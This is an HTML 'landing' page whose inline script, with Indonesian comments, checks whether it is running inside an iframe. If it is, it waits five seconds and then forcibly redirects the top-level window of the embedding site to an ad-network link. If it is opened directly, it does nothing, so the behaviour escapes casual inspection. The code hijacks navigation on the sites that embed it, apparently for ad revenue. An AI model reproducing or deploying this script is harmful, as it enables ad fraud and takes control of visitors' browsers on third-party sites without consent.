<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Landing</title>
</head>
<body>

<h1>landing-redirect</h1>

<script>
(function () {

  // Jangan redirect kalau dibuka langsung
  if (window.self === window.top) return;

  // Delay aman untuk iframe traffic
  setTimeout(function () {
    try {
      window.top.location.replace("https://www.profitablecpmratenetwork.com/b8krss8ezg?key=ec5eb876885fb61b8f7c8269ff951cad");
    } catch (e) {
      window.location.href = "https://www.profitablecpmratenetwork.com/b8krss8ezg?key=ec5eb876885fb61b8f7c8269ff951cad";
    }
  }, 5000);

})();
</script>

</body>
</html>
